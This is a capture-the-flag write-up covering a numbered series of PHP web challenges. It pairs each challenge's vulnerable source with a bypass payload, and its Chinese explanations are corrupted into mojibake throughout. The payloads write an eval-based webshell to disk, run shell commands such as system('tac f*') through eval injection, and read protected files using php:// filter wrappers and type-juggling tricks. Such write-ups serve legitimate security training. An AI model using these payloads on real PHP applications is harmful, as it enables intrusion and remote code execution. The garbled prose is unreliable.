å½“ç„¶å…¶å® %09ï¼Œ%0bï¼Œ+ç­‰éƒ½å¯ä»¥ç»•è¿‡ 95&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]|\\./i&quot;, $num)){ die(&quot;no no no!!&quot;); } if(!strpos($num, &quot;0&quot;)){ die(&quot;no no no!!!&quot;); } if(intval($num,0)===4476){ echo $flag; } } å¤šè¿‡æ»¤äº†ä¸€ä¸ª . å’Œä¸Šé¢˜ä¸€æ ·,åªä¸è¿‡ä¸èƒ½ç”¨å°æ•°ç»•è¿‡äº† 96highlight_file(__FILE__); if(isset($_GET[&#39;u&#39;])){ if($_GET[&#39;u&#39;]==&#39;flag.php&#39;){ die(&quot;no no no&quot;); }else{ highlight_file($_GET[&#39;u&#39;]); } } /var/www/html/flag.php ç»å¯¹è·¯å¾„ ./flag.php ç›¸å¯¹è·¯å¾„ php://filter/resource=flag.php phpä¼ªåè®® 97 md5&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) { if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;]) if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) echo $flag; else print &#39;Wrong.&#39;; } ?&gt; MD5ç¢°æ’æˆ–è€…æ•°ç»„ç»•è¿‡ 98include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#39;flag&#39;; $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;; $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;; highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__); ?&gt; ä¸»è¦æ˜¯ä¸‰å…ƒè¿ç®—ç¬¦å’Œå˜é‡è¦†ç›– $_GET?$_GET=&amp;$_POST:â€™flagâ€™; æ„æ€å°±æ˜¯è¯´å¦‚æœå­˜åœ¨GETè¯·æ±‚ï¼Œåˆ™å°†POSTè¯·æ±‚è¦†ç›–æ‰GETè¯·æ±‚ highlight_file($_GET[â€˜HTTP_FLAGâ€™]==â€™flagâ€™?$flag: FILE ); æ„æ€å°±æ˜¯è¯´GETä¼ å‚HTTP_FLAGçš„å€¼ä¸ºflagï¼Œåˆ™è¯»å–flagï¼Ÿ æ‰€ä»¥æˆ‘å°±æ„é€ äº†GETï¼š?flag=123 POSTï¼šHTTP_FLAG=flag 99 in_arrayå¼±ç±»å‹æ¯”è¾ƒhighlight_file(__FILE__); $allow = array(); for ($i=36; $i &lt; 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){ file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]); } ?&gt; è€ƒå¯Ÿç‚¹ï¼šphpå¼±ç±»å‹æ¯”è¾ƒ $allow = array(1,&#39;2&#39;,&#39;3&#39;); var_dump(in_array(&#39;1.php&#39;,$allow)); è¿”å›çš„ä¸ºtrue $allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;); var_dump(in_array(&#39;1.php&#39;,$allow)); è¿”å›false in_arrayå»¶ç”¨äº†phpä¸­çš„== å…·ä½“å†…å®¹å¯ä»¥æŸ¥çœ‹phpæ‰‹å†Œ-&gt;é™„å½•-&gt;PHPç±»å‹æ¯”è¾ƒè¡¨ å› ä¸ºæ–°åŠ è¿›å»çš„éšæœºæ•°å­—æ¯æ¬¡éƒ½åŒ…å«1ï¼Œ1å­˜åœ¨çš„å‡ ç‡æ˜¯æœ€å¤§çš„ã€‚ æ‰€ä»¥ç›´æ¥å†™ n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;å¤šè¯•å‡ æ¬¡å³å¯ 100.101 andä¸&amp;&amp;ä¸=ä¼˜å…ˆçº§highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#39;v1&#39;]; $v2=$_GET[&#39;v2&#39;]; $v3=$_GET[&#39;v3&#39;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(&quot;/\\;/&quot;, $v2)){ if(preg_match(&quot;/\\;/&quot;, $v3)){ eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;); } } } ?&gt; çŸ¥è¯†ç‚¹ä¸€ï¼šand ä¸ &amp;&amp; åŸæœ¬ä»¥ä¸ºä¸¤ä¸ªéƒ½æ˜¯ä¸€æ ·çš„,ä½†å…¶å®è¿ç®—çº§æœ‰åŒºåˆ«,å› ä¸ºèµ‹å€¼è¿ç®—çš„ä¼˜å…ˆçº§æ¯”ANDå’ŒORçš„é«˜ï¼Œæ‰€ä»¥å…ˆèµ‹å€¼ï¼›æ¯”&amp;&amp;å’Œ||çš„ä½ï¼Œæ‰€ä»¥é€»è¾‘è¿ç®—ç¬¦å…ˆæ‰§è¡Œï¼Œå…ˆé€»è¾‘è¿ç®—ï¼Œå†èµ‹å€¼ã€‚ æ‰€ä»¥è¿™é‡Œå…¶å®åªéœ€è¦is_numberic($v1)ä¸ºçœŸå°±è¡Œ çŸ¥è¯†ç‚¹äºŒ: ReflectionClass ç±» https://blog.csdn.net/miuzzx/article/details/109168454 payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 100éé¢„æœŸè§£1 ç›´æ¥è¾“å‡º$ctfshow;æ„é€ å‡º var_dump($ctfshow); payload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/; 100éé¢„æœŸè§£2 å› ä¸ºè¿‡æ»¤çš„å­—ç¬¦æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚ æ–¹æ³•ä¸å›ºå®šï¼Œåœ¨æ­¤èšä¸¤ä¸ªä¾‹å­ v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/ v1=1&amp;v2=-system(&#39;ls&#39;)-&amp;v3=-1; 102-103highlight_file(__FILE__); $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; $v3 = $_GET[&#39;v3&#39;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4){ $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str); } else{ die(&#39;hacker&#39;); } ?&gt; æ¬è¿å¸ˆå‚…ä»¬çš„å§ å…ˆæ¥è¯´ä¸‹é¢˜ç›®æœ¬æ„ is_numericåœ¨php5çš„ç¯å¢ƒä¸­ï¼Œæ˜¯å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¼ å…¥v2=0x66ä¹Ÿæ˜¯å¯ä»¥è¯†åˆ«ä¸ºæ•°å­—çš„ã€‚ var_dump(is_numeric(&quot;0x66&quot;)); php5çš„ç¯å¢ƒä¸‹è¿”å›true php7è¿”å›false ä¹‹åç»è¿‡æˆªæ–­æˆ‘ä»¬å°±å¾—åˆ°äº†16è¿›åˆ¶ï¼Œè€Œä¸”æ˜¯ä¸å¸¦0xçš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°hex2binå°†16è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ä»è€Œå†™å…¥æœ¨é©¬æ–‡ä»¶ã€‚ï¼ˆhex2binå¦‚æœå‚æ•°å¸¦0xä¼šæŠ¥é”™ï¼‰ å…·ä½“åšæ³•ï¼š é¦–å…ˆå°†æˆ‘ä»¬çš„ä¸€å¥è¯ç¼–ç æˆ16è¿›åˆ¶ &lt;?php eval($_POST[1]);?&gt; 0x3c3f706870206576616c28245f504f53545b315d293b3f3e æ¥ç€ç›´æ¥ä¼ å…¥v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php post:v1=hex2bin å³å¯å®Œæˆæœ¨é©¬çš„å†™å…¥ã€‚ æœ¬åœ°æµ‹è¯•æˆåŠŸå†™å…¥æœ¨é©¬ã€‚ ä½†æ˜¯è¯¥é¢˜ç¯å¢ƒæ²¡æœ‰è®¾ç½®å¥½ç”¨çš„æ˜¯php7ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¾—æ‰¾åˆ°å¦å¤–ä¸€ç§æ–¹æ³•ç»•è¿‡ã€‚ è™½ç„¶æ–‡ä»¶å†…å®¹ä¸å¥½æ§åˆ¶ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ä¼ªåè®®å°†å†…å®¹è¿›è¡Œç¼–ç è½¬æ¢ã€‚ æ‰€ä»¥å¦‚æœèƒ½æ‰¾åˆ°ä¸€æ¡phpè¯­å¥ç»è¿‡base64ç¼–ç ï¼Œåœ¨è½¬æ¢ä¸º16è¿›åˆ¶ä¹‹åå…¨éƒ¨éƒ½æ˜¯æ•°å­—ä¸å°±å¯ä»¥é€šè¿‡äº†å—ï¼Ÿ ä¹Ÿå°±æ˜¯è¯´ $a=&quot;xxx&quot;; $b=base64_encode($a); $c=bin2hex($b); å¦‚æœ$cå…¨éƒ¨éƒ½æ˜¯çº¯æ•°å­—å°±å¯ä»¥äº†ã€‚ 1234 è¿™é‡Œç›´æ¥å€Ÿç”¨å…¶ä»–å¸ˆå‚…çš„payload $a=&#39;&lt;?=`cat *`;&#39;; $b=base64_encode($a); // PD89YGNhdCAqYDs= $c=bin2hex($b); //è¿™é‡Œç›´æ¥ç”¨å»æ‰=çš„base64 è¾“å‡º 5044383959474e6864434171594473 å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚ å¤§å®¶å¯ä»¥å°è¯•ä¸‹å»æ‰=å’Œå¸¦ç€=çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚å› ä¸ºç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ã€‚ 1234567 æœ€ç»ˆpayloadï¼šv2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin 104highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(sha1($v1)==sha1($v2)){ echo $flag; } } ?&gt; sha1ç¢°æ’ï¼Œä½¿ç”¨æ•°ç»„ 105highlight_file(__FILE__); include(&#39;flag.php&#39;); error_reporting(0); $error=&#39;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#39;; $suces=&#39;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#39;; foreach($_GET as $key =&gt; $value){ if($key===&#39;error&#39;){ die(&quot;what are you doing?!&quot;); } $$key=$$value; }foreach($_POST as $key =&gt; $value){ if($value===&#39;flag&#39;){ die(&quot;what are you doing?!&quot;); } $$key=$$value; } if(!($_POST[&#39;flag&#39;]==$flag)){ die($error); } echo &quot;your are good&quot;.$flag.&quot;\\n&quot;; die($suces); ?&gt; è¿™é‡Œç”¨äº†foreachè¿›è¡Œå˜é‡è¦†ç›– å°†$error = $flag æˆæœåœ¨die($error)ä¸­è¾“å‡º 106-107highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){ echo $flag; } } ?&gt; æ•°ç»„,ç¢°æ’ 108&lt;?php highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE) { die(&#39;error&#39;); } //åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag if(intval(strrev($_GET[&#39;c&#39;]))==0x36d){ echo $flag; } ?&gt; ereg â€” æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é… 0x36dæ˜¯ 877 æ‰€ä»¥æ„é€  ?c=a%00aaaa778 å½“é€šè¿‡strrevå’Œintvalçš„æ—¶å€™ï¼Œä¸º 877 109highlight_file(__FILE__); error_reporting(0); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;&amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2)){ eval(&quot;echo new $v1($v2());&quot;); } } ?&gt; è€ƒå¯Ÿç‚¹ï¼šphp å¼‚å¸¸ç±» å…ˆæ¥çœ‹ä¸‹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼/[a-zA-Z]+/ åŒ¹é…è‡³å°‘æœ‰ä¸€ä¸ªå­—æ¯çš„å­—ç¬¦ä¸² æ‰€ä»¥æˆ‘ä»¬åªè¦è®©newåé¢æœ‰ä¸ªç±»ä¸æŠ¥é”™ä»¥åï¼Œå°±å¯ä»¥éšæ„æ„é€ äº†ã€‚æˆ‘ä»¬éšä¾¿æ‰¾ä¸ªphpä¸­çš„å†…ç½®ç±»å¹¶ä¸”å¯ä»¥ç›´æ¥echoè¾“å‡ºçš„å°±å¯ä»¥äº†ã€‚ ä¸¾ä¸¤ä¸ªä¾‹å­ Exception ReflectionClas new ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œé‡Œé¢çš„systemå‡½æ•°,è™½ç„¶æœ€åReflection(system(â€˜tac fâ€˜)())ä¼šæŠ¥é”™,ä½†å…¶å®å·²ç»ä¸å½±å“æˆ‘ä»¬æ‰§è¡Œsystem(â€˜tac f\\â€˜) payload: v1=Exception();system(&#39;tac f*&#39;);//&amp;v2=a v1=ReflectionClass&amp;v2=system(&#39;tac f*&#39;) 110 highlight_file(__FILE__); error_reporting(0); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#39;, $v1)){ die(&quot;error v1&quot;); } if(preg_match(&#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#39;, $v2)){ die(&quot;error v2&quot;); } eval(&quot;echo new $v1($v2());&quot;); } ?&gt; åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ http://phpffff.com/fifilesystemiterator https://www.php.net/manual/zh/class.fifilesystemiterator.php getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½• payload: ?v1=FilesystemIterator&amp;v2=getcwd 111highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); function getFlag(&amp;$v1,&amp;$v2){ eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1); } if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#39;, $v1)){ die(&quot;error v1&quot;); } if(preg_match(&#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#39;, $v2)){ die(&quot;error v2&quot;); } if(preg_match(&#39;/ctfshow/&#39;, $v1)){ getFlag($v1,$v2); } } ?&gt; è€ƒå¯Ÿç‚¹ï¼šphpè¶…å…¨å±€å˜é‡$GLOBALSçš„ä½¿ç”¨ ä»‹ç» $GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ ä¸¾ä¸ªä¾‹å­ $a=123; $b=456; var_dump($GLOBALS); è¿”å›å†…å®¹è¾ƒå¤šå°±ä¸ä¸€ä¸€åˆ—å‡ºäº†ã€‚æˆ‘ä»¬åªçœ‹æœ€åä¸¤æ¡ï¼Œå‘ç°æˆ‘ä»¬è‡ªè¡Œå®šä¹‰çš„å˜é‡ä¼šè¢«è¾“å‡ºã€‚ [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) 112function filter($file){ if(preg_match(&#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){ die(&quot;hacker!&quot;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } è€ƒå¯Ÿç‚¹ï¼šphpä¼ªåè®®ç»•è¿‡is_file+highlight_fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨ å‡½æ•°ä»‹ç» is_file â€” åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ is_file ( string $filename ) : bool 12 æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸èƒ½è®©is_fileæ£€æµ‹å‡ºæ˜¯æ–‡ä»¶ï¼Œå¹¶ä¸” highlight_fileå¯ä»¥è¯†åˆ«ä¸ºæ–‡ä»¶ã€‚è¿™æ—¶å€™å¯ä»¥åˆ©ç”¨phpä¼ªåè®®ã€‚ å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®® payload:file=php://filter/resource=flag.php ä¹Ÿå¯ä»¥ç”¨ä¸€äº›æ²¡æœ‰è¿‡æ»¤æ‰çš„ç¼–ç æ–¹å¼å’Œè½¬æ¢æ–¹å¼ payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php file=compress.zlib://flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 113highlight_file(__FILE__); error_reporting(0); function filter($file){ if(preg_match(&#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){ die(&quot;hacker!&quot;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } è€ƒå¯Ÿï¼š php7.4é‡Œé¢çš„trick åŒ…å«æ–‡ä»¶32 ä¼šæº¢å‡º,å‚è€ƒmake php great again éé¢„æœŸ compress.zlib://flag.php 114 error_reporting(0); highlight_file(__FILE__); function filter($file){ if(preg_match(&#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#39;,$file)){ die(&#39;hacker!&#39;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } ç•™äº†ä¸ªfilter payload:file=php://filter/resource=flag.php 115 trimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡function filter($num){ $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num; } $num=$_GET[&#39;num&#39;]; if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;){ if($num==&#39;36&#39;){ echo $flag; }else{ echo &quot;hacker!!&quot;; } }else{ echo &quot;hacker!!!&quot;; } è€ƒå¯Ÿç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡ å‡½æ•°ä»‹ç» è¯­æ³• trim(string,charlist) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚ charlist å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼š &quot;\\0&quot; - NULL &quot;\\t&quot; - åˆ¶è¡¨ç¬¦ &quot;\\n&quot; - æ¢è¡Œ &quot;\\x0B&quot; - å‚ç›´åˆ¶è¡¨ç¬¦ &quot;\\r&quot; - å›è½¦ &quot; &quot; - ç©ºæ ¼ åšä¸ªç®€å•çš„å°æµ‹è¯• for ($i=0; $i &lt;128 ; $i++) { $x=chr($i).&#39;1&#39;; if(is_numeric($x)==true){ echo urlencode(chr($i)).&quot;\\n&quot;; } } é™¤äº†æ•°å­—å’Œ+-.å·ä»¥å¤–è¿˜æœ‰ %09 %0a %0b %0c %0d %20 å†æ¥çœ‹çœ‹ trim+is_numeric for ($i=0; $i &lt;=128 ; $i++) { $x=chr($i).&#39;1&#39;; if(trim($x)!==&#39;1&#39; &amp;&amp; is_numeric($x)){ echo urlencode(chr($i)).&quot;\\n&quot;; } } å‘ç°é™¤äº†+-.å·ä»¥å¤–è¿˜æœ‰åªå‰©ä¸‹%0cä¹Ÿå°±æ˜¯æ¢é¡µç¬¦äº†ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜åªæœ‰è¿™ä¸€ä¸ªå›ºå®šçš„è§£äº†ã€‚ payload:num=%0c3 116117118119120121122123 PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§å’Œregister_argc_argvhttps://www.freebuf.com/articles/web/213359.html $a=$_SERVER[&#39;argv&#39;]; $c=$_POST[&#39;fun&#39;]; if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;])){ if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\&quot;|\\&#39;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18){ eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;){ echo $flag; } } } ç¬¬ä¸€ä¸ªéš¾æçš„åœ°æ–¹isset($_POST[&#39;CTF_SHOW.COM&#39;])å› ä¸ºphpå˜é‡å‘½åæ˜¯ä¸å…è®¸ä½¿ç”¨ç‚¹å·çš„ ç„¶åæœ¬åœ°æµ‹è¯•ï¼Œåˆå¥½åƒå› ä¸ºè§„åˆ™é—®é¢˜,å¯¼è‡´.å¯ä»¥è½¬åŒ–å‡ºæ¥ å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ 1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹ ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[&#39;argv&#39;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•° 2ã€webç½‘é¡µæ¨¡å¼ä¸‹ åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™] $argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨ å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨ç½‘é¡µæ¨¡å¼ä¸‹è¿è¡Œçš„ï¼Œæ‰€ä»¥$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]ä¹Ÿå°±æ˜¯$a[0]= $_SERVER[&#39;QUERY_STRING&#39;] è¿™æ—¶å€™æˆ‘ä»¬åªè¦é€šè¿‡ eval(&quot;$c&quot;.&quot;;&quot;);å°†$flagèµ‹å€¼flag_give_meå°±å¯ä»¥äº†ã€‚ get: $fl0g=flag_give_me; post: CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0]) POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag #125 GET:?1=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1]) #126 GET:?a=1+fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) or GET:?$fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 7 127include(&quot;flag.php&quot;); highlight_file(__FILE__); $ctf_show = md5($flag); $url = $_SERVER[&#39;QUERY_STRING&#39;]; //ç‰¹æ®Šå­—ç¬¦æ£€æµ‹ function waf($url){ if(preg_match(&#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\&#39;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#39;, $url)){ return true; }else{ return false; } } if(waf($url)){ die(&quot;å—¯å“¼ï¼Ÿ&quot;); }else{ extract($_GET); } if($ctf_show===&#39;ilove36d&#39;){ echo $flag; } payloadï¼š ?ctf show=ilove36d 128error_reporting(0); include(&quot;flag.php&quot;); highlight_file(__FILE__); $f1 = $_GET[&#39;f1&#39;]; $f2 = $_GET[&#39;f2&#39;]; if(check($f1)){ var_dump(call_user_func(call_user_func($f1,$f2))); }else{ echo &quot;å—¯å“¼ï¼Ÿ&quot;; } function check($str){ return !preg_match(&#39;/[0-9]|[a-z]/i&#39;, $str); } https://www.cnblogs.com/lost-1987/articles/3309693.html https://www.php.net/manual/zh/book.gettext.php å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•° _()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll æ‰€ä»¥ call_user_func(&#39;_&#39;,&#39;phpinfo&#39;) è¿”å›çš„å°±æ˜¯phpinfo å› ä¸ºæˆ‘ä»¬è¦å¾—åˆ°çš„flagå°±åœ¨flag.phpä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨get_defined_vars get_defined_vars()å‡½æ•° get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag payload: ?f1=_&amp;f2=get_defined_vars 129if(isset($_GET[&#39;f&#39;])){ $f = $_GET[&#39;f&#39;]; if(stripos($f, &#39;ctfshow&#39;)&gt;0){ echo readfile($f); } } å‡½æ•°ä»‹ç» stripos() 